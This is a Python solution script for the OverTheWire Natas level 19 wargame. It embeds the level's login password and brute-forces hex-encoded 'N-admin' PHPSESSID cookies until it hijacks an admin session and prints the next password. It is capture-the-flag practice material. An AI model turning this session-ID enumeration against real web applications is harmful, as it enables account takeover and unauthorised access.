import requests

URL = "http://natas19.natas.labs.overthewire.org/index.php"

session = requests.Session()
session.auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

auth = session.post(URL)

for i in range(1, 641):
    user = "admin"
    cookiestring = str(i) + "-" + user
    decimal_values = [ord(char) for char in cookiestring]
    hex_representation = ''.join(f'{val:02x}' for val in decimal_values)
    COOKIES = requests.cookies.create_cookie(domain="natas19.natas.labs.overthewire.org", name="PHPSESSID",value=f"{hex_representation} ")
    session.cookies.set_cookie(COOKIES)
    req = session.get(url=URL)
    if "You are an admin" in req.text:
        print(req.text.split("Password: ", 1)[1].split("<", 1)[0])
        break

